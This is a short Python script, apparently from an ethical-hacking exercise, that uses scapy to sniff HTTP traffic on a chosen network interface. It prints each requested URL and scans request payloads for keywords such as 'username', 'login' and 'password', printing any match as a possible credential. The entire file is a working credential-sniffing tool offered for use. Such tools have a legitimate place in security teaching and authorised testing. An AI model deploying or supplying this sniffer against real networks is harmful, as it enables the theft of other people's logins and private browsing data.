#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Interface to sniff on")
    options = parser.parse_args()
    if not options.interface:
        # handle error
        parser.error("[-] Please specify an Interface to sniff on, use --help for more info")
    return options

def sniff(interface):
    print("[+] Sniffing active on " + interface)
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        packet_url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print("[+] HTTP Request >> " + packet_url)
        if packet.haslayer(scapy.Raw):
            packet_load = packet[scapy.Raw].load
            strings_to_check = ["username", "user", "uname", "email", "login", "pass", "password"]
            if any(keyword in packet_load for keyword in strings_to_check):
                print("\n\n[+] Possible Username or Password >> " + packet_load + "\n\n")

options = get_arguments()
sniff(options.interface)